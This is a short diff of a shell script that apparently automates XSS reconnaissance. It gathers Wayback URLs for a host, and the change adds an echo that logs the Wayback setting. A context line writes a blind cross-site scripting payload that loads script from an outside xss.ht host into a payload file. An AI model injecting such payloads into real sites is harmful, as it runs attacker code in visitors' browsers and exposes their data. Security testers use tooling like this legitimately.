@@ -117,6 +117,8 @@ if [ "$WAYBACK" == "true" ]; then
     waybackurls $HOST > waybackurls.txt
 fi
 
+echo "[i] Wayback set to $WAYBACK"
+
 # Write payloads to a file
 echo "[i] Writing payloads to file"
 echo "\"><script src=https://$XSSHT.xss.ht></script>" > xssPayloadLogVenom.txt
